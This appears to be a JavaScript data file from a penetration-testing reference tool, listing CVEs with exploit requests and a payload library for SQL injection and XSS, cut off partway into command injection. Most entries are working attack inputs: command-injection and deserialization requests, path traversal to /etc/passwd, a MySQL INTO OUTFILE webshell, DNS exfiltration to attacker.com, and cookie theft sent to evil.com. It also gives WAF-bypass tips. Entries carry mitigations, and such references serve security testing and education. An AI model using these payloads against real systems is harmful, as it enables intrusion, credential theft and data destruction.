  { id: 'CVE-2023-20887', name: 'VMware Aria Operations RCE', severity: 'Critical', cvss: 9.8, published: '2023-06-07', category: 'RCE', affected: 'VMware Aria Operations for Networks < 6.11', description: 'Unauthenticated RCE via command injection in VMware Aria Operations for Networks (formerly vRealize Network Insight). Attackers inject commands through the Apache Thrift RPC interface.', exploit: 'Command injection via /saas/res498765/res498765 endpoint through Thrift RPC', mitigation: 'Apply VMware patches, restrict network access to Aria Operations.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-20887'], tags: ['vmware', 'aria', 'thrift', 'command-injection', 'pre-auth'], platform: 'Linux' },
  { id: 'CVE-2019-2215', name: 'Android Binder Use-After-Free', severity: 'High', cvss: 7.8, published: '2019-10-11', category: 'Privilege Escalation', affected: 'Android kernel (Binder driver)', description: 'Use-after-free in Android Binder IPC driver allowing local privilege escalation to root. Exploited as zero-day by NSO Group to install Pegasus spyware on target devices.', exploit: 'Trigger race condition in binder_thread_release by forking while epoll monitors /dev/binder', mitigation: 'Apply Android security patches from October 2019.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-2215'], tags: ['android', 'kernel', 'binder', 'use-after-free', 'nso', 'pegasus'], platform: 'IoT' },
  { id: 'CVE-2020-9054', name: 'Zyxel NAS RCE', severity: 'Critical', cvss: 9.8, published: '2020-02-24', category: 'RCE', affected: 'Zyxel NAS326, NAS520, NAS540, NAS542', description: 'Pre-authentication command injection in Zyxel NAS devices via the weblogin.cgi script. Username parameter is passed unsanitized to OS commands, allowing arbitrary code execution.', exploit: 'curl "http://target/adv,/cgi-bin/weblogin.cgi?username=admin;id"', mitigation: 'Apply Zyxel firmware update, restrict management access.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-9054'], tags: ['zyxel', 'nas', 'iot', 'command-injection', 'pre-auth'], platform: 'IoT' },
  { id: 'CVE-2021-25281', name: 'SaltStack REST API Auth Bypass', severity: 'Critical', cvss: 9.8, published: '2021-02-25', category: 'Auth Bypass', affected: 'SaltStack Salt < 3002.5, < 3001.6', description: 'Authentication bypass in the Salt-API REST interface allowing any user to run commands on Salt minions. The eauth mechanism can be bypassed to execute arbitrary commands as root.', exploit: 'curl -X POST http://target:8000/run -H "Content-Type: application/json" -d \'{"client":"runner","fun":"salt.cmd","kwarg":{"fun":"cmd.run","cmd":"id"}}\'', mitigation: 'Upgrade SaltStack, restrict Salt-API access with firewall rules.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-25281'], tags: ['saltstack', 'salt', 'rest-api', 'auth-bypass'], platform: 'Linux' },
  { id: 'CVE-2021-3129', name: 'Laravel Ignition RCE', severity: 'Critical', cvss: 9.8, published: '2021-01-12', category: 'RCE', affected: 'Laravel < 8.4.2, Ignition < 2.5.2', description: 'RCE via Laravel Ignition debug mode. When debug mode is enabled, the _ignition/execute-solution endpoint allows arbitrary file manipulation and code execution via Phar deserialization.', exploit: 'POST /_ignition/execute-solution\n{"solution":"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"x","viewFile":"php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log"}}', mitigation: 'Disable debug mode in production (APP_DEBUG=false), upgrade Ignition.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-3129'], tags: ['laravel', 'php', 'ignition', 'debug', 'phar'], platform: 'Cross-platform' },
  { id: 'CVE-2018-17246', name: 'Kibana LFI/RCE', severity: 'Critical', cvss: 9.8, published: '2018-12-14', category: 'RCE', affected: 'Kibana < 6.4.3, < 5.6.13', description: 'Local file inclusion in Kibana via the Console plugin API proxy. Allows importing arbitrary JavaScript files from the server filesystem, leading to remote code execution.', exploit: 'GET /api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../etc/passwd', mitigation: 'Upgrade Kibana, restrict access to the API console.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2018-17246'], tags: ['kibana', 'elasticsearch', 'lfi', 'api-proxy'], platform: 'Cross-platform' },
  { id: 'CVE-2017-10271', name: 'WebLogic XMLDecoder RCE', severity: 'Critical', cvss: 9.8, published: '2017-10-19', category: 'RCE', affected: 'Oracle WebLogic Server 10.3.6, 12.1.3, 12.2.1.1-2', description: 'Remote code execution via XMLDecoder deserialization in WebLogic WLS Security component at /wls-wsat/CoordinatorPortType endpoint. Massively exploited for cryptocurrency mining.', exploit: 'POST /wls-wsat/CoordinatorPortType HTTP/1.1\nContent-Type: text/xml\n\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>id</string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header></soapenv:Envelope>', mitigation: 'Apply Oracle October 2017 CPU, block access to /wls-wsat/*.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2017-10271'], tags: ['weblogic', 'oracle', 'java', 'xmldecoder', 'wls-wsat'], platform: 'Cross-platform' },
  { id: 'CVE-2020-17519', name: 'Apache Flink Path Traversal', severity: 'High', cvss: 7.5, published: '2021-01-05', category: 'Info Disclosure', affected: 'Apache Flink 1.11.0 - 1.11.2', description: 'Path traversal in Apache Flink REST API allowing unauthenticated reading of any file on the JobManager filesystem. The /jobmanager/logs/ endpoint does not properly validate file paths.', exploit: 'curl "http://target:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"', mitigation: 'Upgrade to Apache Flink 1.11.3+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-17519'], tags: ['flink', 'apache', 'path-traversal', 'rest-api'], platform: 'Cross-platform' },
  { id: 'CVE-2021-44077', name: 'ManageEngine ServiceDesk RCE', severity: 'Critical', cvss: 9.8, published: '2021-11-28', category: 'RCE', affected: 'ManageEngine ServiceDesk Plus < 11306, SupportCenter Plus < 11014', description: 'Unauthenticated RCE in ManageEngine ServiceDesk Plus via the REST API. File upload without authentication allows writing a webshell to the webroot for arbitrary code execution.', exploit: 'POST /RestAPI/ImportTechnicians HTTP/1.1\nContent-Type: multipart/form-data\n\nUpload malicious .jsp file via technician import functionality', mitigation: 'Apply ManageEngine patches, restrict access to REST API endpoints.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-44077'], tags: ['manageengine', 'java', 'file-upload', 'rest-api', 'pre-auth'], platform: 'Cross-platform' },
  { id: 'CVE-2019-3396', name: 'Confluence Widget SSTI', severity: 'Critical', cvss: 9.8, published: '2019-03-25', category: 'RCE', affected: 'Atlassian Confluence Server < 6.6.12, < 6.12.3, < 6.13.3, < 6.14.2', description: 'Server-side template injection in Confluence Widget Connector macro. Attackers can inject Velocity template code to achieve path traversal and remote code execution.', exploit: 'POST /rest/tinymce/1/macro/preview\n{"contentId":"1","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/test","_template":"file:///etc/passwd"}}}', mitigation: 'Upgrade Confluence, disable Widget Connector macro.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-3396'], tags: ['confluence', 'atlassian', 'velocity', 'ssti', 'macro'], platform: 'Cross-platform' },
  { id: 'CVE-2019-16759', name: 'vBulletin Pre-Auth RCE', severity: 'Critical', cvss: 9.8, published: '2019-09-24', category: 'RCE', affected: 'vBulletin 5.x', description: 'Unauthenticated RCE in vBulletin via the widget_tabbedcontainer_tab_panel AJAX route. Attackers can execute arbitrary PHP code by exploiting improper template rendering.', exploit: 'POST /ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nsubWidgets[0][template]=widget_php&subWidgets[0][config][code]=system("id");', mitigation: 'Apply vBulletin patches, restrict access to AJAX handlers.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-16759'], tags: ['vbulletin', 'php', 'forum', 'template', 'pre-auth'], platform: 'Web' },
  { id: 'CVE-2022-40684', name: 'FortiOS Auth Bypass', severity: 'Critical', cvss: 9.8, published: '2022-10-10', category: 'Auth Bypass', affected: 'FortiOS 7.0.0-7.0.6, 7.2.0-7.2.1, FortiProxy 7.0.0-7.0.6, 7.2.0', description: 'Authentication bypass via crafted HTTP request using the Forwarded header in FortiOS and FortiProxy admin interface. Allows unauthenticated access to perform any administrative operation.', exploit: 'PUT /api/v2/cmdb/system/admin/admin HTTP/1.1\nForwarded: for="[127.0.0.1]:8000";by="[127.0.0.1]:9000";', mitigation: 'Upgrade FortiOS/FortiProxy, disable HTTP/HTTPS admin interface from internet.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-40684'], tags: ['fortinet', 'fortios', 'fortiproxy', 'auth-bypass', 'forwarded-header'], platform: 'Network' },
  { id: 'CVE-2021-38647', name: 'OMIGOD', severity: 'Critical', cvss: 9.8, published: '2021-09-14', category: 'RCE', affected: 'Microsoft OMI (Open Management Infrastructure) < 1.6.8.1', description: 'Unauthenticated RCE in Microsoft OMI agent silently installed on Azure Linux VMs. Sending a SOAP request without authentication headers allows command execution as root.', exploit: 'curl -k -X POST "https://target:5986/wsman" -H "Content-Type: application/soap+xml" -d \'<Envelope>...ExecuteShellCommand...id...</Envelope>\'', mitigation: 'Upgrade OMI to 1.6.8.1+, block port 5985/5986, check Azure VMs for vulnerable OMI installs.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-38647'], tags: ['azure', 'microsoft', 'omi', 'linux', 'cloud', 'pre-auth'], platform: 'Cloud' },
  { id: 'CVE-2021-21985', name: 'vCenter Server RCE (VSAN)', severity: 'Critical', cvss: 9.8, published: '2021-05-25', category: 'RCE', affected: 'VMware vCenter Server 6.5, 6.7, 7.0', description: 'RCE in vCenter Server vSAN Health Check plugin. Lack of input validation in the plugin allows unauthenticated attackers to execute arbitrary commands with unrestricted privileges.', exploit: 'POST /ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.ProxygenController/ReverseProxyGen498765 HTTP/1.1\n{"methodInput":[{"type":"java.lang.Runtime","value":""}]}', mitigation: 'Apply VMware patches, disable vSAN Health Check plugin if not needed.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-21985'], tags: ['vmware', 'vcenter', 'vsan', 'pre-auth', 'plugin'], platform: 'Cross-platform' },
  { id: 'CVE-2018-10933', name: 'libssh Auth Bypass', severity: 'Critical', cvss: 9.1, published: '2018-10-18', category: 'Auth Bypass', affected: 'libssh 0.6.0 - 0.7.5, 0.8.0 - 0.8.3', description: 'SSH authentication bypass by presenting SSH2_MSG_USERAUTH_SUCCESS to the server instead of SSH2_MSG_USERAUTH_REQUEST. The server-side state machine accepts the "success" message as valid.', exploit: 'python3 -c "import libssh; s=libssh.Session(); s.connect(host); s.userauth_success()"', mitigation: 'Upgrade libssh (does NOT affect OpenSSH).', references: ['https://nvd.nist.gov/vuln/detail/CVE-2018-10933'], tags: ['libssh', 'ssh', 'auth-bypass', 'state-machine'], platform: 'Cross-platform' },
  { id: 'CVE-2017-1000117', name: 'Git SSH Command Injection', severity: 'Critical', cvss: 8.8, published: '2017-08-10', category: 'RCE', affected: 'Git < 2.14.1', description: 'Remote code execution via crafted SSH URL in Git. A repository with a malicious SSH URL (ssh://-oProxyCommand=...) causes arbitrary command execution when cloned.', exploit: 'git clone "ssh://-oProxyCommand=id/test"', mitigation: 'Upgrade Git to 2.14.1+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2017-1000117'], tags: ['git', 'ssh', 'command-injection', 'url'], platform: 'Cross-platform' },
  { id: 'CVE-2022-22947', name: 'Spring Cloud Gateway RCE', severity: 'Critical', cvss: 10.0, published: '2022-03-01', category: 'RCE', affected: 'Spring Cloud Gateway < 3.1.1, < 3.0.7', description: 'RCE via SpEL injection in Spring Cloud Gateway Actuator API. Attackers can create malicious routes with SpEL expressions in predicates and filters to execute arbitrary commands.', exploit: 'POST /actuator/gateway/routes/hacktest -H "Content-Type: application/json" -d \'{"id":"hacktest","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\\"id\\").getInputStream()))}"}}],"uri":"http://example.com"}\'', mitigation: 'Upgrade Spring Cloud Gateway, disable Actuator endpoints in production.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-22947'], tags: ['spring', 'java', 'spel', 'gateway', 'actuator'], platform: 'Cross-platform' },
  { id: 'CVE-2020-2555', name: 'Oracle Coherence Deserialization', severity: 'Critical', cvss: 9.8, published: '2020-01-15', category: 'Deserialization', affected: 'Oracle Coherence 3.7.1.17, 12.1.3, 12.2.1.x', description: 'RCE via unsafe deserialization in Oracle Coherence T3 protocol. A crafted T3 request containing malicious serialized objects triggers arbitrary code execution on WebLogic servers using Coherence.', exploit: 'java -jar coherence_exploit.jar target 7001 "id"\n# Uses ValueExtractor chain from Coherence library', mitigation: 'Apply Oracle January 2020 CPU, restrict T3 protocol access.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-2555'], tags: ['oracle', 'coherence', 'weblogic', 'java', 't3'], platform: 'Cross-platform' },
  { id: 'CVE-2021-26857', name: 'Exchange UM Deserialization', severity: 'High', cvss: 7.8, published: '2021-03-02', category: 'Deserialization', affected: 'Microsoft Exchange Server 2019, 2016, 2013', description: 'Insecure deserialization in Exchange Unified Messaging service. Part of the HAFNIUM attack chain. When exploited with ProxyLogon, allows SYSTEM-level code execution on Exchange servers.', exploit: 'Send crafted SOAP request to UM service after obtaining authentication via CVE-2021-26855', mitigation: 'Apply March 2021 Exchange security updates.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-26857'], tags: ['exchange', 'microsoft', 'deserialization', 'unified-messaging', 'hafnium'], platform: 'Windows' },
  { id: 'CVE-2023-48788', name: 'FortiClient EMS SQLi', severity: 'Critical', cvss: 9.8, published: '2024-03-12', category: 'SQLi', affected: 'FortiClient EMS 7.2.0-7.2.2, 7.0.1-7.0.10', description: 'SQL injection in FortiClient Enterprise Management Server (EMS). Unauthenticated attacker can execute arbitrary SQL commands on the backend database via crafted requests to the FCTDaemon.', exploit: 'Inject SQL via FCTUID parameter in DAS protocol communication on port 8013', mitigation: 'Upgrade FortiClient EMS to 7.2.3+ or 7.0.11+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-48788'], tags: ['fortinet', 'forticlient', 'ems', 'sql-injection', 'pre-auth'], platform: 'Windows' },
  { id: 'CVE-2024-0012', name: 'PAN-OS Auth Bypass', severity: 'Critical', cvss: 9.8, published: '2024-11-18', category: 'Auth Bypass', affected: 'Palo Alto Networks PAN-OS < 10.2.12-h2, < 11.0.6-h1, < 11.1.5-h1, < 11.2.4-h1', description: 'Authentication bypass in PAN-OS management web interface. Unauthenticated attacker with network access to the management interface can gain admin privileges and perform administrative actions.', exploit: 'Craft requests to bypass authentication checks in management web interface', mitigation: 'Upgrade PAN-OS, restrict management interface to trusted IPs, apply Threat Prevention signatures.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2024-0012'], tags: ['paloalto', 'pan-os', 'firewall', 'auth-bypass', 'management'], platform: 'Network' },
  { id: 'CVE-2023-4863', name: 'WebP Heap Buffer Overflow', severity: 'Critical', cvss: 8.8, published: '2023-09-11', category: 'Buffer Overflow', affected: 'libwebp < 1.3.2 (Chrome, Firefox, Safari, etc.)', description: 'Heap buffer overflow in WebP image codec (libwebp) allowing arbitrary code execution via a crafted WebP image. Affects virtually all browsers and many applications. Exploited as zero-day by NSO Group.', exploit: 'Crafted WebP image with malicious Huffman table triggers heap overflow during decoding', mitigation: 'Update browsers and all applications using libwebp.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-4863'], tags: ['webp', 'libwebp', 'chrome', 'browser', 'heap-overflow', 'nso', 'zero-day'], platform: 'Cross-platform' },
  { id: 'CVE-2021-43798', name: 'Grafana Path Traversal', severity: 'High', cvss: 7.5, published: '2021-12-07', category: 'Info Disclosure', affected: 'Grafana 8.0.0 - 8.3.0', description: 'Unauthenticated path traversal in Grafana allowing arbitrary file read. Plugin routes do not properly sanitize file paths, enabling directory traversal to read sensitive files.', exploit: 'curl "http://target:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"', mitigation: 'Upgrade Grafana to 8.3.1+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-43798'], tags: ['grafana', 'path-traversal', 'plugin', 'pre-auth', 'monitoring'], platform: 'Cross-platform' },
  { id: 'CVE-2021-34527', name: 'PrintNightmare (RCE variant)', severity: 'High', cvss: 8.8, published: '2021-07-01', category: 'RCE', affected: 'Windows Print Spooler (all versions)', description: 'RCE variant of PrintNightmare. Remote authenticated attackers can execute code as SYSTEM by installing a malicious print driver. The PoC was accidentally published before the patch.', exploit: 'python3 CVE-2021-34527.py domain/user:pass@target \'\\\\attacker\\share\\evil.dll\'', mitigation: 'Disable Print Spooler on Domain Controllers, apply out-of-band patch, restrict driver installation.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-34527'], tags: ['windows', 'print-spooler', 'dll-loading', 'remote'], platform: 'Windows' },
  { id: 'CVE-2023-3519', name: 'Citrix NetScaler RCE', severity: 'Critical', cvss: 9.8, published: '2023-07-18', category: 'RCE', affected: 'Citrix NetScaler ADC/Gateway 12.1-13.1', description: 'Pre-authentication RCE in Citrix NetScaler ADC and Gateway. Stack buffer overflow in SAML-related functionality allows unauthenticated code execution on the appliance.', exploit: 'Stack overflow via crafted SAML assertion sent to /cgi/saml_logout endpoint', mitigation: 'Apply Citrix patches immediately, check for webshells, rotate credentials.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-3519'], tags: ['citrix', 'netscaler', 'saml', 'stack-overflow', 'pre-auth'], platform: 'Network' },
  { id: 'CVE-2019-8943', name: 'WordPress Crop Image RCE', severity: 'High', cvss: 6.5, published: '2019-02-19', category: 'RCE', affected: 'WordPress < 5.0.1', description: 'Path traversal in WordPress image cropping function (wp_crop_image). An author-level user can exploit the image crop feature to write arbitrary files including PHP code to any directory.', exploit: 'Upload image → crop with crafted path traversal in meta → PHP file written to webroot', mitigation: 'Update WordPress to 5.0.1+, restrict author upload capabilities.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-8943'], tags: ['wordpress', 'php', 'path-traversal', 'image-crop', 'cms'], platform: 'Web' },
];


// ═══════════════════════════════════════════════════════════════
//  EXPLOIT PATTERNS DATA
// ═══════════════════════════════════════════════════════════════
const EXPLOIT_PATTERNS = {
  'SQL Injection': [
    { name: 'Auth Bypass (OR)', payload: "' OR 1=1--", desc: 'Classic authentication bypass using OR true condition.', where: 'Login forms, auth endpoints', waf: 'Try: OR 1=1-- -, OR/**/1=1--, oR 1=1--' },
    { name: 'Auth Bypass (Comment)', payload: "admin'--", desc: 'Comment out password check after username.', where: 'Login forms', waf: "Try: admin'#, admin'/*" },
    { name: 'Auth Bypass (String)', payload: "' OR 'a'='a", desc: 'String comparison always true.', where: 'Login forms', waf: "Try: ' OR 'a'='a'/*" },
    { name: 'UNION Column Count', payload: "' ORDER BY 1--", desc: 'Incrementally detect column count by ordering.', where: 'Search, listing endpoints', waf: 'Try: ORDER/**BY/**/1--' },
    { name: 'UNION NULL Detection', payload: "' UNION SELECT NULL,NULL,NULL--", desc: 'Find valid column count using NULL values.', where: 'Any injectable parameter', waf: 'Try: /*!50000UNION*/SELECT NULL--' },
    { name: 'UNION Extract Version', payload: "' UNION SELECT NULL,version(),NULL--", desc: 'Extract database version via UNION.', where: 'Points echoing data', waf: "Try: UNION SELECT NULL,@@version,NULL--" },
    { name: 'UNION Extract Tables', payload: "' UNION SELECT table_name,NULL FROM information_schema.tables--", desc: 'List all tables in the database.', where: 'Data reflection points', waf: 'URL-encode or hex-encode keywords' },
    { name: 'UNION Extract Columns', payload: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", desc: 'List columns of a specific table.', where: 'Data reflection points', waf: 'Use CHAR() for string comparisons' },
    { name: 'Blind Boolean (True)', payload: "' AND 1=1--", desc: 'Verify injectable parameter: page should load normally.', where: 'Any parameter', waf: "Try: ' AND 1=1--+-" },
    { name: 'Blind Boolean (False)', payload: "' AND 1=2--", desc: 'Page should differ from true condition.', where: 'Any parameter', waf: "Try: ' AND 1=2--+-" },
    { name: 'Blind Boolean (Substring)', payload: "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--", desc: 'Extract data one character at a time.', where: 'Blind SQLi endpoints', waf: 'Use MID() or SUBSTR() as alternatives' },
    { name: 'Blind Time-based', payload: "' AND IF(1=1,SLEEP(5),0)--", desc: 'Time-based detection: page delays if vulnerable.', where: 'Any parameter (no output needed)', waf: "Try: BENCHMARK(5000000,SHA1('test'))--" },
    { name: 'Blind Time (Extract)', payload: "' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--", desc: 'Extract data via time delays character by character.', where: 'Blind SQLi endpoints', waf: 'Use PG_SLEEP for PostgreSQL' },
    { name: 'Error-based (ExtractValue)', payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--", desc: 'MySQL error-based extraction using ExtractValue.', where: 'MySQL with verbose errors', waf: 'Try: UPDATEXML(1,CONCAT(0x7e,version()),1)' },
    { name: 'Error-based (Convert)', payload: "' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--", desc: 'MSSQL error-based via type conversion error.', where: 'MSSQL with verbose errors', waf: 'Try CAST() as alternative' },
    { name: 'Stacked Query', payload: "'; DROP TABLE users--", desc: 'Execute multiple queries. Destructive example — use with caution.', where: 'MSSQL, PostgreSQL (not MySQL by default)', waf: 'May be blocked by driver-level restrictions' },
    { name: 'Second-Order SQLi', payload: "admin'-- (register as username)", desc: 'Store payload in DB, triggers when data is used in another query.', where: 'Registration, profile updates', waf: 'Hard to detect with WAF — stored then triggered' },
    { name: 'WAF Bypass (Comments)', payload: "' UN/**/ION SE/**/LECT 1,2,3--", desc: 'Bypass keyword detection using inline comments.', where: 'WAF-protected endpoints', waf: 'Also try: /*!UNION*/ /*!SELECT*/' },
    { name: 'WAF Bypass (Case)', payload: "' uNiOn SeLeCt 1,2,3--", desc: 'Mixed case to bypass case-sensitive filters.', where: 'Basic WAF implementations', waf: 'Also try: Un%69on Sel%65ct' },
    { name: 'WAF Bypass (Encoding)', payload: "' %55NION %53ELECT 1,2,3--", desc: 'URL-encoded characters to bypass filters.', where: 'WAF-protected endpoints', waf: 'Double-encode: %2555NION' },
    { name: 'PostgreSQL COPY', payload: "COPY cmd_exec FROM PROGRAM 'id';", desc: 'Execute OS commands via PostgreSQL COPY command.', where: 'PostgreSQL with SUPERUSER access', waf: 'Requires appropriate privileges' },
    { name: 'Out-of-Band (MySQL)', payload: "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))--", desc: 'Exfiltrate data via DNS using LOAD_FILE.', where: 'MySQL on Windows with UNC access', waf: 'Requires MySQL on Windows' },
    { name: 'MSSQL xp_cmdshell', payload: "'; EXEC xp_cmdshell 'whoami'--", desc: 'Execute OS commands via MSSQL xp_cmdshell.', where: 'MSSQL with sysadmin privileges', waf: 'May need: EXEC sp_configure "xp_cmdshell",1; RECONFIGURE' },
    { name: 'NoSQL Injection (MongoDB)', payload: '{"username": {"$gt": ""}, "password": {"$gt": ""}}', desc: 'Bypass authentication in MongoDB using comparison operators.', where: 'Node.js/Express apps with MongoDB', waf: 'Also try: {"$ne": null}, {"$regex": ".*"}' },
    { name: 'NoSQL Injection (Regex)', payload: '{"username": {"$regex": "^admin"}, "password": {"$regex": "^."}}', desc: 'Extract data using regex matching in MongoDB.', where: 'MongoDB-backed auth endpoints', waf: 'Iterate characters with $regex: "^a", "^ab", etc.' },
    { name: 'SQLite Injection', payload: "' UNION SELECT sql FROM sqlite_master--", desc: 'Dump table schema from SQLite database.', where: 'Applications using SQLite', waf: 'Also try: SELECT name FROM sqlite_master WHERE type="table"' },
    { name: 'Oracle UNION', payload: "' UNION SELECT NULL,banner FROM v$version--", desc: 'Extract Oracle database version.', where: 'Oracle-backed applications', waf: 'Oracle requires matching column count and types' },
    { name: 'WHERE Clause Bypass', payload: "1 OR 1=1", desc: 'Numeric parameter injection for WHERE clause.', where: 'Numeric parameters (id=)', waf: 'Try: 1 OR 2>1, 1 || 1=1 (Oracle)' },
    { name: 'GROUP BY Error', payload: "' GROUP BY columnnames HAVING 1=1--", desc: 'Force error to reveal column names.', where: 'MSSQL, MySQL with errors', waf: 'Incremental discovery of columns' },
    { name: 'INTO OUTFILE', payload: "' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'--", desc: 'Write webshell to disk via SQL query.', where: 'MySQL with FILE privilege and known webroot', waf: 'Requires MySQL FILE privilege' },
  ],
  'XSS (Cross-Site Scripting)': [
    { name: 'Classic Script', payload: '<script>alert(1)</script>', desc: 'Basic reflected XSS.', where: 'Unsanitized output', waf: 'Blocked by most WAFs' },
    { name: 'IMG Onerror', payload: '<img src=x onerror=alert(1)>', desc: 'Image error event handler.', where: 'Image/media contexts', waf: 'Try: <img/src=x onerror=alert(1)>' },
    { name: 'SVG Onload', payload: '<svg onload=alert(1)>', desc: 'SVG element event handler.', where: 'SVG-allowed contexts', waf: 'Try: <svg/onload=alert(1)>' },
    { name: 'Body Onload', payload: '<body onload=alert(1)>', desc: 'Body element event handler.', where: 'HTML injection in body', waf: 'Requires injection before </body>' },
    { name: 'Input Autofocus', payload: '<input onfocus=alert(1) autofocus>', desc: 'Auto-triggered focus event.', where: 'Form contexts', waf: 'Try: <input/onfocus=alert(1)/autofocus>' },
    { name: 'Details Toggle', payload: '<details open ontoggle=alert(1)>', desc: 'Details element toggle event.', where: 'HTML5 contexts', waf: 'Less commonly filtered' },
    { name: 'JavaScript URI', payload: 'javascript:alert(1)', desc: 'JavaScript protocol handler.', where: 'href attributes, redirects', waf: 'Try: jaVasCrIpT:alert(1)' },
    { name: 'Data URI', payload: 'data:text/html,<script>alert(1)</script>', desc: 'Data URI scheme with HTML content.', where: 'iframe src, redirect', waf: 'Try: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' },
    { name: 'Quote Breakout', payload: '"><script>alert(1)</script>', desc: 'Break out of attribute value.', where: 'Attribute value contexts', waf: "Try: '><script>alert(1)</script>" },
    { name: 'Mixed Case', payload: '<ScRiPt>alert(1)</ScRiPt>', desc: 'Mixed case to bypass filters.', where: 'Case-sensitive filters', waf: 'Combine with encoding' },
    { name: 'Entity Encoded', payload: '<img src=x onerror="&#97;lert(1)">', desc: 'HTML entity encoding bypass.', where: 'HTML entity decoding contexts', waf: 'Also try: &#x61;lert(1)' },
    { name: 'Template Literal', payload: '<script>alert`1`</script>', desc: 'Template literal instead of parentheses.', where: 'Parenthesis-filtered contexts', waf: 'Also try: alert?.()' },
    { name: 'Iframe Srcdoc', payload: '<iframe srcdoc="<script>alert(1)</script>">', desc: 'XSS via iframe srcdoc attribute.', where: 'Iframe-allowed contexts', waf: 'Less commonly filtered' },
    { name: 'Cookie Theft', payload: "<script>fetch('http://evil.com/?c='+document.cookie)</script>", desc: 'Exfiltrate cookies to attacker server.', where: 'Stored XSS scenarios', waf: 'Use Burp Collaborator for testing' },
    { name: 'DOM innerHTML', payload: 'document.getElementById("x").innerHTML="<img src=x onerror=alert(1)>"', desc: 'DOM-based XSS via innerHTML.', where: 'JavaScript sinks', waf: 'Look for: innerHTML, outerHTML, document.write' },
    { name: 'Event Handler Poly', payload: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>', desc: 'SVG animate element event.', where: 'SVG contexts', waf: 'Less commonly filtered' },
    { name: 'Mutation XSS', payload: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">', desc: 'Exploit DOM mutation differences between parser and sanitizer.', where: 'DOMPurify bypass scenarios', waf: 'Targets specific sanitizer versions' },
    { name: 'Polyglot Payload', payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//", desc: 'Works in multiple contexts simultaneously.', where: 'Unknown context', waf: 'Useful for fuzzing' },
    { name: 'Fetch Exfiltration', payload: '<script>fetch("https://evil.com/steal?"+document.cookie)</script>', desc: 'Modern cookie/data exfiltration via fetch API.', where: 'Stored XSS with same-origin', waf: 'Use navigator.sendBeacon as alternative' },
    { name: 'Meta Refresh', payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">', desc: 'XSS via meta refresh tag.', where: 'HTML injection in head', waf: 'Blocked in modern browsers' },
    { name: 'Object Tag', payload: '<object data="javascript:alert(1)">', desc: 'Object element with JavaScript URI.', where: 'HTML injection', waf: 'Try: <embed src="javascript:alert(1)">' },
    { name: 'Onscroll Event', payload: '<div style="height:9999px" onscroll=alert(1)><br><br>...scroll...', desc: 'Trigger XSS via scrolling.', where: 'Large content injection', waf: 'Requires user scroll action' },
    { name: 'CSS Expression (IE)', payload: '<div style="width:expression(alert(1))">', desc: 'CSS expression (Internet Explorer only).', where: 'Legacy IE environments', waf: 'IE only — for legacy testing' },
    { name: 'Anchor Focus', payload: '<a id=x tabindex=1 onfocus=alert(1)></a>', desc: 'Trigger via anchor focus with tab.', where: 'HTML injection', waf: 'Combine with #x URL fragment' },
    { name: 'Base64 Eval', payload: '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">', desc: 'Base64 encoded payload execution.', where: 'WAF bypassing', waf: 'Decodes to alert(1)' },
  ],
  'Command Injection': [
    { name: 'Semicolon Chain', payload: '; id', desc: 'Chain command using semicolon.', where: 'Unix/Linux systems', waf: 'Most basic injection point' },
